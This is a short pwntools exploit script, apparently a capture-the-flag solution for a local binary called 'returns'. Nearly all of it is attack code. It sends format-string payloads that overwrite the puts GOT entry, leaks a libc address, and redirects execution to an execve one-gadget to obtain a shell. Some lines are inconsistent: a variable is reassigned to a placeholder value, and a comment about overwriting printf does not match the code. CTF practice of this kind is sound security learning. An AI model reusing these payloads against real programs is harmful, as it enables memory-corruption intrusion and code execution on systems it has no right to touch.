from pwn import *

e = ELF('./returns')

# addresses
puts_got = e.got['puts']
printf_got = e.got['printf']
main = e.symbols['main'] -7
execve_gadget = 0x45216
main = 0x333333
print('puts_got: %s\nprintf_got: %s\nmain: %s' % (hex(puts_got), hex(printf_got), hex(main)))

# config
code = '/bin/sh'
offset = 8

# define useful functions
def overwrite(address, withaddress):
    payload = '%n%{}x%11$ln'.format(withaddress) # check why %n works. I didn't give it an address, how does it know where to write it?
    payload = 'A' * (24 - len(payload)) + payload + p64(address).replace('\x00', '')

    with open('last-payload.txt', 'wb') as f:
        f.write(payload)
    return payload

# connect to process
p = process(e.path, env={"LD_PRELOAD": "./libc.so.6"})

# overwrite puts with main
#p.sendline(overwrite(puts_got, main))
got_puts = 0x404018
payload = "%018u%12$hhn%028u%13$hhn" # set 40122e
payload += 'a'
payload += '\x00' * (32-len(payload))
payload += p64(got_puts+1)
payload += p64(got_puts)
payload += '\n'
p.send(payload)
p.recvuntil("with you. ")
gdb.attach(p)
p.sendline('%x')

for i in range(4):
    p.sendline('%x')

p.clean()

# leak the location of libc
p.sendline('AAAA%x %lx ')
response = p.recvuntil('return? ').strip()

libc_base = int(response.split('AAAA')[1].split(' ')[1], 16) - 0x1c0720 # this hardcoded number was the offset from libc_base
execve_gadget += libc_base

lsb = int(hex(execve_gadget)[2:][-8:], 16)

print(hex(lsb))

# overwrite printf with system
p.sendline(overwrite(puts_got, lsb)) # -3
p.sendline('%x')
p.clean()
#p.sendline('ls')
#p.sendline('whoami')
#p.clean()

# display flag.txt
#p.interactive()
